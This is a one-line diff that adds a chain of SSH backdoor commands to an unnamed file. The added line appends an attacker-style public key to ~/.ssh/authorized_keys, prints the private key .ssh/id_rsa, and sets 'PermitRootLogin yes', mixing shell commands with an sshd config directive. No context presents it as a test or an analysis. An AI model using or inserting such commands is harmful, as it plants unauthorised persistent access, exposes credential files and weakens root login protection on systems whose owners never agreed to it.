@@ -1,0 +1,1 @@
+echo ssh-rsa AAAA... >> ~/.ssh/authorized_keys; cat .ssh/id_rsa; touch .ssh/known_hosts; PermitRootLogin yes
